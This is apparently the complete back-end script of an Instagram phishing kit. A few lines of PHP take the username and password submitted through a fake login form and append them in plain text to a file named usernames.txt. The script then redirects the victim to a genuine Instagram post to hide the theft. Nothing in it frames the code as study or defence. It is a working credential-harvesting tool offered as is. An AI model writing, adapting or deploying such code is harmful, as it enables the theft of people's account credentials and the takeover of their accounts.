<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: http://www.instagram.com/p/CUka-dcFYjl/');
exit();
?>
